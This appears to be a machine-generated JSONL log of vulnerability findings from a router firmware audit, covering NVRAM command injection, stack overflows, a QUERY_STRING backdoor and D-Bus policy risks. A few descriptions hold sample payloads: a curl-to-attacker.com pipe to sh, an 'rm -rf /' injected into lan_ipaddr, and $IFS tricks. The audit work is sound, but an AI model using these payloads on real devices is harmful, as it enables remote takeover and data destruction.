{"name": "cmd_injection-nvram_leafp2p_sys_prefix", "file_path": "etc/init.d/leafp2p.sh", "location": "etc/init.d/leafp2p.sh:5-6,8,12 (start)", "risk_score": 9.0, "confidence": 8.25, "description": "Attackers can inject malicious paths by tampering with the NVRAM 'leafp2p_sys_prefix' value: 1) SYS_PREFIX is directly used to construct script paths (${SYS_PREFIX}/bin/checkleafnets.sh) 2) PATH is modified to prioritize ${SYS_PREFIX}/bin. Trigger conditions: a) Attackers can write to NVRAM (e.g., via web vulnerabilities) b) Execution of /etc/init.d/leafp2p.sh start. Boundary check: No path validation or filtering. Actual impact: Combined with background execution mechanisms (${CHECK_LEAFNETS} &), it can lead to arbitrary command execution. Exploitation method: Placing a forged checkleafnets.sh in the malicious path to achieve privilege escalation.", "code_snippet": "SYS_PREFIX=$(${nvram} get leafp2p_sys_prefix)\nPATH=${SYS_PREFIX}/bin:...\n${CHECK_LEAFNETS} &", "link_identifiers": ["leafp2p_sys_prefix", "SYS_PREFIX", "CHECK_LEAFNETS", "checkleafnets.sh", "nvram get", "PATH", "start()"], "notes": "Verification required: 1) Security of NVRAM write interface 2) Actual implementation of checkleafnets.sh. Subsequent analysis of the NVRAM setting functionality in the web interface is recommended."}
{"name": "network_input-remote-web_exposure", "file_path": "etc/init.d/remote.sh", "location": "etc/init.d/remote.sh:12-19", "risk_score": 8.0, "confidence": 8.25, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["ln -s", "/tmp/www/cgi-bin/RMT_invite.cgi", "REDACTED_SENSITIVE_DATA", "leafp2p_services"], "notes": "The actual risk depends on: 1) whether the web server loads /tmp/www, and 2) whether vulnerabilities exist in RMT_invite.cgi/func.sh."}
{"name": "nvram_set-leafp2p-port_config", "file_path": "etc/init.d/remote.sh", "location": "etc/init.d/remote.sh:21-72", "risk_score": 7.0, "confidence": 7.75, "description": "The leafp2p service configuration (e.g., leafp2p_service_0) is initialized through 9 sets of nvram_set operations. When the NVRAM value is empty, default values containing high-risk ports (135/136/445/548) are set. Trigger condition: Automatically executed upon service startup. Attackers can manipulate service behavior by tampering with NVRAM but must first obtain NVRAM write permissions.", "code_snippet": "${nvram} set leafp2p_service_0=\"RouterRemote,0,1,1,1,1,6:135,6:136,6:137,6:138,6:139,6:445,17:548\"", "link_identifiers": ["nvram get", "nvram set", "nvram commit", "leafp2p_service_0", "leafp2p_remote_url"], "notes": "Verify whether the port is actually open. Recommended next steps: 1) Scan service ports 2) Check NVRAM write protection mechanism"}
{"name": "command_execution-afpd-send_wol_background", "file_path": "etc/init.d/afpd", "location": "etc/init.d/afpd:14", "risk_score": 6.5, "confidence": 8.0, "description": "The script starts the send_wol service (/usr/sbin/send_wol) to run in the background, sending WOL packets. Trigger conditions: system startup or manual execution of '/etc/init.d/afpd start'. This service exposes a network attack surface, allowing attackers to send forged WOL packets or exploit its vulnerabilities for denial-of-service attacks. The MAXCONS=7 parameter is used directly without boundary checks but is not actually utilized by the afpd service.", "code_snippet": "/usr/sbin/send_wol 300 &", "link_identifiers": ["send_wol", "start()", "MAXCONS", "/usr/sbin/send_wol"], "notes": "The binary verification of send_wol requires separate risk analysis. Related finding: cmd_injection-nvram_leafp2p_sys_prefix (etc/init.d/leafp2p.sh). If an attacker achieves arbitrary command execution through NVRAM pollution, this service could potentially be compromised."}
{"name": "file_write-afpd-applevolumes_config", "file_path": "etc/init.d/afpd", "location": "etc/init.d/afpd:4-6", "risk_score": 5.0, "confidence": 6.0, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["AFP_CONF_DIR", "/tmp/netatalk", "REDACTED_SENSITIVE_DATA"], "notes": "Verify whether the configuration file content contains user-controllable parameters"}
{"name": "ipc-afpd-reload_update_afp", "file_path": "etc/init.d/afpd", "location": "etc/init.d/afpd", "risk_score": 4.0, "confidence": 3.0, "description": "The reload() function calls the undefined update_afp function (likely located in /etc/rc.common). Trigger condition: executing '/etc/init.d/afpd reload'. If this function contains vulnerabilities (such as command injection), attackers could potentially trigger them through the reload operation. Currently, there is no evidence to verify its implementation.", "link_identifiers": ["reload()", "update_afp", "/etc/rc.common"], "notes": "Analyze /etc/rc.common to verify the implementation of update_afp."}
{"name": "ipc-dbus-session-policy", "file_path": "etc/session.conf", "location": "etc/session.conf", "risk_score": 8.5, "confidence": 9.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["eavesdrop", "send_destination", "max_message_size", "session.d", "session-local.conf", "<policy>", "<limit>"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "configuration_load-dbus_system_policy_include", "file_path": "etc/system.conf", "location": "etc/system.conf", "risk_score": 7.5, "confidence": 7.0, "description": "The D-Bus system bus configuration file exposure policy includes a mechanism: loading external policy files via the <includedir>system.d</includedir> directive. If an attacker can tamper with policy files in the system.d directory (e.g., through path traversal or weak permissions), they can override default security policies (such as deny own=\"*\"). Successful exploitation requires: 1) improper permission configuration of the system.d directory, and 2) the existence of a file write vulnerability. Impacts include: regular users registering malicious services, sending unauthorized method calls, leading to privilege escalation or system control.", "code_snippet": "<includedir>system.d</includedir>\n<policy context=\"default\">\n  <deny own=\"*\"/>\n  <deny send_type=\"method_call\"/>\n</policy>", "link_identifiers": ["includedir>system.d", "deny own=\"*\"", "deny send_type=\"method_call\"", "policy context=\"default\""], "notes": "Verify the permission settings of the system.d directory and the integrity of policy files. Subsequent analysis should include: 1) Permissions of the /etc/dbus-1/system.d directory 2) Content of each service policy file"}
{"name": "configuration_load-dbus_privileged_servicehelper", "file_path": "etc/system.conf", "location": "etc/system.conf", "risk_score": 8.0, "confidence": 6.25, "description": "Privileged service launcher path configuration: servicehelper points to the high-privilege binary /usr/libexec/dbus-daemon-launch-helper. This component runs with REDACTED_PASSWORD_PLACEHOLDER privileges. If vulnerabilities (such as buffer overflow) exist, they could form a complete attack chain when combined with the D-Bus message passing mechanism. Trigger conditions: 1) The binary contains memory corruption vulnerabilities 2) Attackers can craft malicious D-Bus messages. Impact includes direct REDACTED_PASSWORD_PLACEHOLDER privilege escalation, as this helper is responsible for launching system-level services.", "code_snippet": "<servicehelper>/usr/libexec/dbus-daemon-launch-helper</servicehelper>", "link_identifiers": ["servicehelper>/usr/libexec/dbus-daemon-launch-helper", "auth>EXTERNAL", "REDACTED_SENSITIVE_DATA"], "notes": "Binary analysis is required for /usr/libexec/dbus-daemon-launch-helper. The attack surface includes: triggering vulnerabilities by passing malicious data through local inter-process communication (IPC)."}
{"name": "config-permission-avahi-dbus-setHostName", "file_path": "etc/avahi-dbus.conf", "location": "etc/dbus-1/system.d/avahi-dbus.conf: [HIDDEN]", "risk_score": 6.5, "confidence": 6.5, "description": "The avahi-dbus.conf configuration poses a privilege escalation risk: The default policy explicitly denies all users from invoking the SetHostName method (<deny send_member=\"SetHostName\"/>), but members of the REDACTED_PASSWORD_PLACEHOLDER group are granted unrestricted access (<allow group=\"REDACTED_PASSWORD_PLACEHOLDER\"/>). This leads to: 1) REDACTED_PASSWORD_PLACEHOLDER group members can bypass security restrictions to call sensitive methods 2) If SetHostName contains vulnerabilities (e.g., buffer overflow), attackers gaining REDACTED_PASSWORD_PLACEHOLDER group privileges could trigger them 3) The actual risk depends on SetHostName's implementation security, but since the avahi-daemon binary cannot be located, the existence of specific vulnerabilities and boundary checks cannot be verified.", "code_snippet": "<policy context=\"default\">\n  <deny send_member=\"SetHostName\"/>\n</policy>\n<policy group=\"REDACTED_PASSWORD_PLACEHOLDER\">\n  <allow send_destination=\"org.freedesktop.Avahi\"/>\n</policy>", "link_identifiers": ["org.freedesktop.Avahi.Server", "SetHostName", "<policy>", "<allow group=\"REDACTED_PASSWORD_PLACEHOLDER\"/>", "<deny send_member=\"SetHostName\"/>", "avahi-dbus.conf", "adminHIDDEN"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "REDACTED_SENSITIVE_DATA", "file_path": "www/cgi-bin/genie.cgi", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 8.0, "confidence": 8.0, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["REDACTED_SENSITIVE_DATA", "strncpy", "X-Error-Code", "X-Error-Message", "fp-0x58", "var_24h"], "notes": "Verify the actual firmware's curl response header length limit and specific stack layout architecture."}
{"name": "network_input-QUERY_STRING_auth_bypass-fcn_000093e4", "file_path": "www/cgi-bin/genie.cgi", "location": "genie.cgi:0x14e (fcn.00009ef8)", "risk_score": 7.5, "confidence": 8.5, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["QUERY_STRING", "getenv", "fcn.000093e4", "param_1"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "configuration_load-url_injection-fcn_0000a3c0", "file_path": "www/cgi-bin/genie.cgi", "location": "genie.cgi:0x14a (fcn.00009ef8)", "risk_score": 6.0, "confidence": 6.5, "description": "Configuration source URL injection risk: The param_2 parameter is obtained through fcn.0000a3c0(0x3954) and used in snprintf to construct the request URL. If the configuration item corresponding to 0x3954 can be tampered with (e.g., via NVRAM settings), a malicious URL could be constructed. Trigger condition: An attacker pollutes the configuration source through other interfaces. Actual impact: May lead to SSRF attacks or internal service probing.", "link_identifiers": ["fcn.0000a3c0", "0x3954", "param_2", "snprintf", "%s?t=%s&d=%s&c=%s"], "notes": "Track the configuration item corresponding to address 0x3954 and its setting interface; potential contamination path association with existing nvram set operations may exist."}
{"name": "command_execution-bd-RCE_8083", "file_path": "sbin/bd", "location": "bd:0xb1cc FUN_0000b1cc", "risk_score": 10.0, "confidence": 9.25, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "pcVar8 = getenv(\"QUERY_STRING\");\nif (pcVar8 != (char *)0x0) {\n    system(pcVar8);\n}", "link_identifiers": ["QUERY_STRING", "system", "getenv", "FUN_0000b1cc", "socket", "bind", "accept"], "notes": "Verification required: 1) Whether bd starts automatically on boot 2) Exposure status of port 8083 3) Associated HTTP service processing flow. Subsequent recommendation: Analyze relevant startup scripts in /etc/init.d/. Note: The knowledge base already contains findings regarding www/cgi-bin/genie.cgi using QUERY_STRING (risk level 7.5), but it's in a different file and only involves authentication bypass, with no direct correlation established."}
{"name": "command_injection-hotplug2-rules_manipulation", "file_path": "sbin/hotplug2", "location": "sbin/hotplug2:0xa8d0 fcn.0000a8d0", "risk_score": 9.0, "confidence": 8.75, "description": "Command injection vulnerability in hotplug2 rules file driver. Trigger conditions: 1) Attacker modifies contents of /etc/hotplug2.rules file 2) Rule contains SYSTEM_ACTION with command containing environment variable placeholders (e.g., $VAR). Vulnerability principle: a) Function fcn.0000a73c performs environment variable substitution without content filtering b) Substitution result is directly passed to system() for execution. Attackers can craft malicious rules (e.g., PATH=/tmp;curl${IFS}attacker.com | sh), achieving RCE when hotplug events trigger the rules. Attack surface: Network interface (if www user has write access to rules file) or physical interface (USB hotplug).", "code_snippet": "uVar9 = fcn.0000a73c(uVar5,param_1);\niVar11 = sym.imp.system();", "link_identifiers": ["fcn.0000a73c", "system", "SYSTEM_ACTION", "/etc/hotplug2.rules"], "notes": "Verify rule file permissions: If the www user has write access to /etc/hotplug2.rules, it forms a complete WEB→configuration tampering→RCE chain. Related knowledge base note: 'Verify whether the configuration file contains user-controllable parameters.'"}
{"name": "command_injection-hotplug2-env_pollution", "file_path": "sbin/hotplug2", "location": "sbin/hotplug2:0xad60", "risk_score": 8.0, "confidence": 7.75, "description": "Second-order command injection caused by environment variable pollution. Trigger conditions: 1) The rule file contains SETENV_ACTION followed by a SYSTEM_ACTION sequence 2) The SYSTEM_ACTION command references variables set by SETENV. Vulnerability principle: a) SETENV_ACTION directly uses rule data to set environment variables b) During SYSTEM_ACTION execution, the shell resolves $ variable references. Attackers can construct: SETENV_ACTION sets 'PATH=/tmp;' then executes '$IFS$PATH/sh' to achieve injection. Actual risk depends on hotplug event frequency and environment variable controllability (e.g., via malicious USB devices).", "code_snippet": "case 0xb: setenv(**(iVar12+4), (*(iVar12+4))[1], 1);\ncase 0: system(fcn.0000a73c(**(iVar12+4), param_1));", "link_identifiers": ["SETENV_ACTION", "SYSTEM_ACTION", "setenv", "$IFS"], "notes": "Dynamic testing is required to assess the controllability of environment variables during USB hot-plug events. Shares the pollution point fcn.0000a73c with Discovery 1."}
{"name": "curl-o-parameter-path-traversal", "file_path": "sbin/curl", "location": "getparameter:0x0000ff9c, operate_do:0x00011a5c", "risk_score": 8.5, "confidence": 8.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "iVar5 = sym.imp.fopen64(*(puVar22 + -0x1c), *0x1226c); // HIDDEN", "link_identifiers": ["getparameter", "case 0x4c", "fopen64", "operate_do", "-o", "output", "curl"], "notes": "Verification in the firmware environment is required: a) whether curl has setuid permissions b) whether any component passes unfiltered user input to curl. Common paths: /usr/bin/curl or /sbin/curl"}
{"name": "curl-T-parameter-arbitrary-read", "file_path": "sbin/curl", "location": "getparameter:0x0000e308, operate_do:0x00011bec", "risk_score": 7.5, "confidence": 8.0, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "uVar5 = sym.imp.open64(*(puVar22 + -0x10), iVar9 + 0);", "link_identifiers": ["getparameter", "case 0x1e", "open64", "operate_do", "-T", "upload", "curl"], "notes": "The associated function is glob_url; it is recommended to subsequently check the firmware file permission model. Common paths: /usr/bin/curl or /sbin/curl."}
{"name": "curl-config-insecure-load", "file_path": "sbin/curl", "location": "getparameter:0x0000e308", "risk_score": 7.0, "confidence": 7.0, "description": "The --config parameter in curl has an insecure loading vulnerability: the user-specified configuration file path is directly passed to parseconfig() in the getparameter function (case 0x28), without protection against path traversal attacks (e.g., '--config ../../tmp/evil.conf'). Malicious configurations can alter security settings such as SSL certificate verification. Trigger condition: an attacker can control both the configuration file path and its content.", "code_snippet": "iVar5 = sym.parseconfig(param_2, param_4);", "link_identifiers": ["getparameter", "case 0x28", "parseconfig", "--config", "curl"], "notes": "Conduct an in-depth analysis of the parseconfig function; relate to high-risk operation: CURLOPT_SSL_VERIFYPEER. Common paths: /usr/bin/curl or /sbin/curl."}
{"name": "heap_overflow-http_request-fcn000087f0", "file_path": "sbin/htmlget", "location": "/sbin/htmlget: [fcn.000087f0]", "risk_score": 8.0, "confidence": 8.25, "description": "In function fcn.000087f0, a heap buffer overflow vulnerability exists when constructing an HTTP request using sprintf. The buffer is allocated with malloc(0x46) for 70 bytes, while the hardcoded request template 'GET /%s HTTP/1.0\\r\\nHost: %s\\r\\nUser-Agent: Linux C 1.0\\r\\nAccept: */*\\r\\n\\r\\n' combined with a 15-byte IP address generates a 71-byte output. The program fails to validate the length of the IP address resolved by gethostbyname, resulting in a single-byte heap overflow. Trigger condition: An attacker can force a 15-byte IPv4 address resolution (e.g., 192.168.100.100) through DNS spoofing. Actual impact: May corrupt heap metadata leading to denial of service or remote code execution, depending on the firmware's heap allocator (e.g., dlmalloc) and memory layout.", "code_snippet": "iVar4 = sym.imp.malloc(0x46);\nsym.imp.sprintf(iVar4,*0x8acc,*0x8abc,*0x8ad0);", "link_identifiers": ["sprintf", "malloc", "gethostbyname", "inet_ntop", "hostname", "fcn.000087f0"], "notes": "The vulnerability relies on DNS spoofing for triggering. It is necessary to verify the behavior of the firmware's heap allocator (e.g., dlmalloc) to assess exploitability. Related file: libc shared library (heap management implementation)."}
{"name": "network_input-pppd_PAP_auth-stack_overflow", "file_path": "sbin/pppd", "location": "sbin/pppd: sym.upap_authwithpeer (HIDDEN)", "risk_score": 9.5, "confidence": 8.75, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "memcpy(puVar9 + iVar3 + 1, puVar5[3], puVar5[4]); // puVar5[3]=HIDDEN, puVar5[4]=HIDDEN", "link_identifiers": ["sym.upap_authwithpeer", "param_3", "auStack_18", "memcpy", "PAP authentication", "puVar5[4]"], "notes": "Pending further verification: 1) Exact overflow offset 2) Feasibility of ASLR/PIE bypass 3) Input filtering mechanism of the associated configuration file REDACTED_PASSWORD_PLACEHOLDER"}
{"name": "command_execution-pppd_script_env-injection_risk", "file_path": "sbin/pppd", "location": "sbin/pppd: script_setenv (HIDDEN)", "risk_score": 7.5, "confidence": 6.75, "description": "Potential risk of environment variable injection: Variables set by script_setenv (such as SPEED) are passed to the /tmp/ppp/ip-up script via /bin/sh. If the variable value is tainted and the script lacks proper filtering, command injection may occur. Trigger condition: The script executes automatically upon PPP connection state changes. Current evidence is insufficient; verification is required for: 1) Whether the SPEED value originates from externally controllable sources 2) Whether the ip-up script contains unsafe variable references.", "link_identifiers": ["script_setenv", "connect_tty", "SPEED", "device_script", "execl", "/tmp/ppp/ip-up", "CONNECT_TIME"], "notes": "Follow-up analysis directions: 1) Examine the contents of the /tmp/ppp/ip-up script 2) Dynamically trace the source of the SPEED value 3) Correlate with the 'setenv' keyword in the knowledge base"}
{"name": "configuration_load-pppd_path_traversal-mitigation", "file_path": "sbin/pppd", "location": "sbin/pppd: sym.options_for_tty (HIDDEN)", "risk_score": 1.0, "confidence": 4.5, "description": "Configuration file path traversal mitigation mechanism: When external inputs (such as PPPoE service names) are used to generate configuration file paths, path traversal is effectively prevented by character substitution ('/' → '.'). Trigger condition: Service names contain malicious characters like ../. Actual impact: The filtering mechanism is reliable, with no path traversal risk.", "link_identifiers": ["sym.options_for_tty", "slprintf", "/tmp/ppp/options.%s/%s.ppp", "HIDDEN"]}
{"name": "attack_chain-pppd_hotplug2-env_injection", "file_path": "sbin/pppd", "location": "HIDDEN: sbin/pppd → sbin/hotplug2", "risk_score": 8.5, "confidence": 6.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "N/A (HIDDEN)", "link_identifiers": ["script_setenv", "SETENV_ACTION", "SYSTEM_ACTION", "/tmp/ppp/ip-up", "SPEED", "$IFS"], "notes": "Correlation found: 1) PPPD environment variable injection risk (command_execution-pppd_script_env-injection_risk) 2) Hotplug2 command injection (command_injection-hotplug2-env_pollution). Verification priority: Check the content of the /tmp/ppp/ip-up script."}
{"name": "command_injection-acos_service-lan_ipaddr", "file_path": "sbin/acos_service", "location": "acos_service:main @ 0xd054", "risk_score": 9.8, "confidence": 9.25, "description": "High-risk command injection vulnerability: When the program executes with the 'start' parameter and NVRAM configuration 'afpd_enable=1', the unvalidated NVRAM value 'lan_ipaddr' is concatenated into a system command via sprintf() and directly executed via system(). Attackers can inject arbitrary commands by setting tainted values (e.g., '127.0.0.1;rm -rf /'). Trigger conditions: 1) Attackers write tainted data through HTTP interfaces or similar 2) The service executes network initialization procedures. Absence of input filtering or boundary checks leads to arbitrary command execution with REDACTED_PASSWORD_PLACEHOLDER privileges.", "code_snippet": "uVar11 = sym.imp.acosNvramConfig_get(*0xcd64);\nsym.imp.sprintf(iVar24 + -0x1e8,*0xccfc,*0xccf8,uVar11);\nsym.imp.system(iVar24 + -0x1e8);", "link_identifiers": ["lan_ipaddr", "afpd_enable", "acosNvramConfig_get", "system", "sprintf", "*0xcd64", "*0xccfc"], "notes": "The complete attack chain has been verified: HTTP interface → NVRAM settings → command execution. Forms an exploitation chain with Discovery 3."}
{"name": "stack_overflow-acos_service-nvram_ce30", "file_path": "sbin/acos_service", "location": "unknown", "risk_score": 9.0, "confidence": 8.25, "description": "High-risk stack overflow vulnerability (dual): 1) NVRAM entry '*0xce30' is written via sprintf(4-byte buffer,\"%d\",value), where integer conversion can overwrite the return address; 2) NVRAM value '*0xca9c' is copied via strcpy(40-byte buffer,value). Trigger condition: control relevant NVRAM entries and trigger service restart. Complete lack of boundary checking enables arbitrary code execution.", "link_identifiers": ["sprintf", "strcpy", "acosNvramConfig_get", "atoi", "*0xce30", "*0xca9c", "auStack_1ce8"], "notes": "nvram_get"}
{"name": "attack_chain-http_to_command", "file_path": "sbin/acos_service", "location": "unknown", "risk_score": 9.5, "confidence": 9.0, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["HTTP_interface", "NVRAM_set", "acosNvramConfig_get", "system", "command_injection"], "notes": "Forms a complete exploitation chain with Discovery 1. It is recommended to analyze the web components under /cgi-bin/ in subsequent steps to verify the NVRAM write interface."}
{"name": "command_execution-ubdcmd-manualset", "file_path": "sbin/ubdcmd", "location": "ubdcmd:0x99e4,0x99f0,0x9a04", "risk_score": 7.5, "confidence": 8.5, "description": "manualset command injection chain: Triggers integer overflow and IP validation bypass via command-line arguments. Trigger condition: Execute `ubdcmd manualset <oversized integer> <malformed IP>`. Specific manifestations: 1) argv[2]/argv[3] directly converted via atoi without boundary checks → integer overflow at 0x9a60 in fcn.00008b98 2) argv[4] bypasses REDACTED_SECRET_KEY_PLACEHOLDER validation → silently uses default IP. Security impact: Network configuration logic corruption may lead to access control bypass. Constraint checks: Parameter count validation exists (argc≥5), but no content/boundary verification.", "code_snippet": "mov r0, [r4, #8]  ; argv[2]\nbl atoi\nmov r0, [r4, #12] ; argv[3]\nbl atoi\nmov r0, [r4, #16] ; argv[4]\nbl REDACTED_SECRET_KEY_PLACEHOLDER", "link_identifiers": ["manualset", "argv[2]", "argv[3]", "argv[4]", "atoi", "REDACTED_SECRET_KEY_PLACEHOLDER", "fcn.00008b98"], "notes": "It is necessary to verify the call frequency of manualset in conjunction with the web interface; correlate with fcn.00008b98 (recvmsg buffer check)."}
{"name": "nvram_get-ubdcmd-detect", "file_path": "sbin/ubdcmd", "location": "ubdcmd:0x91cc,0x93d4,0x8d80", "risk_score": 9.0, "confidence": 9.0, "description": "NVRAM Pollution Attack Chain: Triggering critical vulnerabilities by polluting wan_ipaddr/wan_gateway/pppoe_mtu via HTTP interface. Trigger steps: 1) Set malicious NVRAM values 2) Execute `ubdcmd detect`. Specific manifestations: 1) pppoe_mtu<50 → subl integer underflow at 0x91cc 2) wan_ipaddr pollutes global structure → fcn.00008d80 out-of-bounds read 3) wan_gateway invalid IP → inet_addr failure → infinite loop at 0x8d80. Security impact: Denial of Service/Information Disclosure/Logic Bypass, success probability >80%. Boundary check: acosNvramConfig_get return value used directly without length/content validation.", "code_snippet": "ldr r0, =pppoe_mtu\nbl acosNvramConfig_get\nbl atoi\ncmp r0, #50\nsubls r0, r0, #1  ; HIDDEN", "link_identifiers": ["acosNvramConfig_get", "pppoe_mtu", "wan_ipaddr", "wan_gateway", "detect", "fcn.00008d80", "subls", "inet_addr"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "network_input-ubdcmd-recvmsg", "file_path": "sbin/ubdcmd", "location": "HIDDEN: 0x8e10,0x8ebc,0x8f40,0x9168,0x9a60", "risk_score": 8.5, "confidence": 8.5, "description": "recvmsg buffer flaw: Hardcoded length of 0x420 when receiving network data without validating the actual length. Trigger condition: Sending a crafted UDP packet with length ≠1056 bytes. Specific manifestations: 1) Five call sites with fixed param_2=0x420. 2) Actual received length not validated → short packets can manipulate memory at *0x8e70+0x26, etc. 3) Long packets trigger stack overflow in fcn.00008f04. Security impact: Memory corruption leading to RCE (can form a complete chain when combined with auto command). Boundary check: Only fcn.00008b98 has param_2≤0x420 check, without validating the actual return value of recvmsg.", "code_snippet": "mov r2, #0x420  ; HIDDEN\nbl recvmsg\nldr r3, [sp, #0x400] ; HIDDEN", "link_identifiers": ["recvmsg", "param_2", "0x420", "fcn.00008b98", "fcn.00008f04"], "notes": "Verify the exposure status of UDP ports; correlate with fcn.00008b98 (manualset integer overflow)."}
{"name": "nvram_get-ubdcmd-wan_config", "file_path": "sbin/ubdcmd", "location": "ubdcmd:0x91b4", "risk_score": 7.0, "confidence": 8.25, "description": "NVRAM Variable Handling Vulnerability: Variables (wan_proto/wan_mtu) obtained via acosNvramConfig_get are used directly without validation. Trigger Condition: Executing network configuration-related functions after tampering with NVRAM variables. Specific Manifestations: 1) Direct atoi conversion of strings → Non-numeric input causes logical errors 2) Converted integers used in calculations → Extremely large values trigger integer overflow. Security Impact: Configuration tampering/service crash. Constraint Check: No input filtering or boundary validation.", "code_snippet": "bl acosNvramConfig_get(wan_mtu)\nbl atoi  ; HIDDEN\nsub r0, r0, #10 ; HIDDEN", "link_identifiers": ["acosNvramConfig_get", "wan_proto", "wan_mtu", "atoi", "fcn.000091b4"], "notes": "Track NVRAM pollution vectors globally; associate with atoi (shared conversion function across multiple chains)"}
{"name": "nvram_get-rc-time_zone_env_hijack", "file_path": "sbin/rc", "location": "sbin/rc:0x108ac (main)", "risk_score": 7.0, "confidence": 8.5, "description": "NVRAM variable 'time_zone' pollution leads to environment variable hijacking: In the main function at 0x108ac, the return value of nvram_get(\"time_zone\") is directly set as an environment variable via setenv(\"TZ\", value, 1) without filtering. Attackers can manipulate the TZ variable by tampering with NVRAM (e.g., through HTTP interfaces), affecting time-sensitive services. Trigger condition: The rc script automatically executes during system initialization.", "link_identifiers": ["time_zone", "nvram_get", "setenv", "TZ", "main"], "notes": "Verify the dependency of glibc time functions on TZ; Related knowledge base note: Binary analysis of /usr/libexec/dbus-daemon-launch-helper is required."}
{"name": "command_injection-rc-fcn13974_nvram_eval", "file_path": "sbin/rc", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 9.0, "confidence": 9.0, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "pcVar2 = sym.imp.nvram_get(*0x14910);\nsym.imp.snprintf(..., *0x14958, ...);\nsym.imp._eval(...);", "link_identifiers": ["REDACTED_SENSITIVE_DATA", "_eval", "nvram_get", "snprintf", "*0x14910", "*0x14958"], "notes": "The complete attack chain requires analyzing NVRAM write points in conjunction with HTTP interfaces; related knowledge base note: the security of NVRAM write interfaces needs to be verified."}
{"name": "command_injection-rc-lan_ifnames_eval", "file_path": "sbin/rc", "location": "sbin/rc:0x10c98 (network_init)", "risk_score": 9.0, "confidence": 8.5, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["lan_ifnames", "nvram_get", "_eval", "strspn", "strcspn"]}
{"name": "stack_overflow-rc-fcn0ed80_strcpy", "file_path": "sbin/rc", "location": "rc:0xee8c (fcn.0000ed80)", "risk_score": 9.0, "confidence": 7.75, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "uVar3 = sym.imp.nvram_get(*0xfd98);\nsym.imp.strcpy(puVar10, uVar3);", "link_identifiers": ["strcpy", "nvram_get", "fcn.0000ed80", "puVar10", "*0xfd98"], "notes": "nvram_get"}
{"name": "command_injection-rc-fcn1c1fc_mount", "file_path": "sbin/rc", "location": "rc:0x1c5f4 (fcn.0001c1fc)", "risk_score": 6.0, "confidence": 5.5, "description": "Dynamic system command injection risk: In function fcn.0001c1fc at address 0x1c5f4, the system command parameter (iVar8) constructed by sprintf originates from the mount path. An attacker who can manipulate the mount path (requiring filesystem permissions) could inject commands. This risk is lower than direct input contamination.", "link_identifiers": ["system", "sprintf", "fcn.0001c1fc", "mount", "*0x1c738"]}
{"name": "analysis_limitation-sbin_preinit-unreadable", "file_path": "sbin/preinit", "location": "sbin/preinit", "risk_score": 0.0, "confidence": 5.0, "description": "Analysis limitation: Failed to analyze the 'sbin/preinit' file - two consecutive tool invocations (TaskDelegator) both failed to retrieve file contents. The absence of evidence may be due to tool execution restrictions or file access anomalies. Following the 'evidence-based' principle, no valid security analysis or attack path tracing can be performed without actual file content support.", "code_snippet": "", "link_identifiers": ["preinit"], "notes": "Recommended follow-up actions: 1) Verify whether the file is corrupted or encrypted; 2) Attempt to read directly using alternative analysis tools; 3) If the file is a critical system component, its unanalyzable state may inherently constitute a security risk."}
{"name": "nvram-env-propagation-0x108a8", "file_path": "sbin/init", "location": "init:0x108a8 main", "risk_score": 2.0, "confidence": 5.5, "description": "There exists a data propagation path from NVRAM to environment variables: the return value of nvram_get is set as an environment variable via setenv, which is then read by getenv and compared with a fixed string (strcmp). Trigger condition: the attacker needs to control the content stored in NVRAM. Limited security impact: the comparison result only affects conditional jumps and is not propagated to dangerous functions like system/exec.", "link_identifiers": ["nvram_get", "setenv", "getenv", "strcmp"], "notes": "nvram_get"}
{"name": "static-system-call-0x10cb8", "file_path": "sbin/init", "location": "init:0x10cb8 main", "risk_score": 1.0, "confidence": 5.0, "description": "Detected a system call site (0x10cb8) with parameters sourced from hardcoded address *0x10cb8, uncontaminated by external input. No exec-family function calls found. No boundary check issues as parameters are entirely static.", "link_identifiers": ["system"]}
{"name": "argv-validation-0x107b8", "file_path": "sbin/init", "location": "init:0x107b8 main", "risk_score": 1.0, "confidence": 4.5, "description": "Command-line argument parsing logic is complete: Strict validation of argv[0] and argv[1] content using strstr/strcmp, with all branches directing to fixed functionalities (such as mtd_erase/mtd_write). No missing argument validation or boundary check defects were found.", "link_identifiers": ["strstr", "strcmp", "strncmp", "argv"]}
{"name": "analysis_failure-hotplug-input_validation", "file_path": "sbin/hotplug", "location": "sbin/hotplug:0 (unknown)", "risk_score": 0.0, "confidence": 0.0, "description": "The analysis task failed due to technical reasons: Unable to retrieve the contents of the 'sbin/hotplug' file. This prevents verification of: 1) The handling logic for hotplug event input sources ($ACTION/$DEVPATH, etc.); 2) Whether external inputs are used for dangerous command execution; 3) The security of interactions with firmware components (nvram/iptables). The actual security impact cannot be assessed.", "link_identifiers": ["hotplug", "ACTION", "DEVPATH", "SUBSYSTEM"], "notes": "Manual intervention is required to obtain the file content for reanalysis. Recommendations for follow-up: 1) Verify the integrity of the file system extraction; 2) Attempt to read the script using alternative tools; 3) Prioritize the analysis of other hot-plug-related files in the same directory."}
